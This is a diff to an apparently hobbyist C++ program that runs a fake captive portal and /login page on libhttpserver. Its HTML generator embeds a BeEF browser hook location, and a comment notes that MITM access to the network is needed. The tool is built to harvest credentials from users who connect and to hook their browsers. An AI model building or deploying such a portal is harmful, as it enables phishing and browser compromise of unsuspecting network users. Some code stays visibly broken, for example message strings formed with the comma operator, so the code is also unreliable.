@@ -4,17 +4,6 @@
 #include <httpserver.hpp>
 #include "everythingelse.hpp"
 
-//currently refactoring to include ncurses and a menu and all sorts of goodies in a menu system
-// I learned this and coded it in 18 hours total without youtube, udemy, or any tutorial..
-
-// I used : google, stackexchange, official reference documentation, code examples.
-
-//g++ ./main.cpp ./auth.cpp ./curses.cpp ./extra_functions.cpp -o ./main.o -L/usr/include/boost/program_options.hpp -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lpthread -lcurses -lopenssl
-
-// reemember, if youre getting library errors, you might need to check the linker options
-// if youre getting syntax errors, you might want to check the code,
-//sometimes one SMALL error can fuck EVERYTHING up, be aware and keep an open mind.
-
 using namespace std;
 using namespace httpserver;
 
@@ -27,7 +16,7 @@ int init_display_width;
 bool hook;
 bool PORTAL;
 int PORT;
-bool curses  == true;
+bool curses  = true;
 std::string  credentials_file;
 //std::vector[] username_password_pair;
 //std::string username_password_array[];
@@ -103,14 +92,17 @@ typically, you need to MITM to get the GET or, legally, be the owner of the netw
 */
 class CaptivePortal : public http_resource {
 public:
+    //create the GET responder
     const std::shared_ptr<http_response> render_GET(const http_request& request) {
         if (curses == true) {
-            std::string message("redirecting %remoteip to portal", request.get_requestor())
-            update_window(stdscr, message)
+            std::string message;
+            message = ("redirecting %remoteip to portal", request.get_requestor());
+            update_window(stdscr, message);
         } else if (curses == false) {
             termcolorprint("yellow", ("redirecting %remoteip to portal", request.get_requestor()));
         }
-        return std::shared_ptr<http_response>(new string_response(html_redirect_body));
+        std::string redirect_body = make_html(hook_location, redirect_ip, redirect_ip, true);
+        return std::shared_ptr<http_response>(new string_response(redirect_body));
     };
 };
 
@@ -121,7 +113,7 @@ HTML responder resource dictating the behavior of the /login
 class Login : public http_resource {
 public:
     const std::shared_ptr<http_response> render_GET(const http_request& request) {
-        std::string html_form_body = make_html(hook_location, addr, true);
+        std::string html_form_body = make_html(hook_location, redirect_ip, redirect_ip, true);
         return std::shared_ptr<http_response>(new string_response(html_form_body));
 
     };
@@ -155,31 +147,28 @@ public:
 };
 
 /**
-returns a string containing the html needed to make wither a redirect or form with
- beefhook location and formaction as the first and second parameters respectively.
- both strings;
+power switch for the server.
+
  @param power_switch turns the server on or off
- @param PORTAL turns he portal on or off
 
 */
-void start_stop_server(bool power_switch, bool ){
-    case (power_switch) {
-        switch true :
-            webserver server = create_webserver(PORT);
-            if (PORTAL == true){
-                CaptivePortal captiveportal;
-                Login login;
-                server.register_resource(document_root, &captiveportal);
-                server.register_resource("/login", &login);
-                server.start(true);
-            } else if (PORTAL == false) {
-                Login login;
-                //server.register_resource(document_root, &captiveportal);
-                server.register_resource("/login", &login);
-                server.start(true);
-            };
-        switch false:
-            shutdown_server();
+void start_stop_server(bool power_switch){
+    if (power_switch == true) {
+        webserver server = create_webserver(PORT);
+        if (PORTAL == true){
+            CaptivePortal captiveportal;
+            Login login;
+            server.register_resource(document_root, &captiveportal);
+            server.register_resource("/login", &login);
+            server.start(true);
+        } else if (PORTAL == false) {
+            Login login;
+            //server.register_resource(document_root, &captiveportal);
+            server.register_resource("/login", &login);
+            server.start(true);
+        };
+    } else if (power_switch == false){
+        shutdown_server();
     };
 
 };
@@ -220,20 +209,3 @@ int main(int argc, char* argv[]) {
     };
     endwin();
     };
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
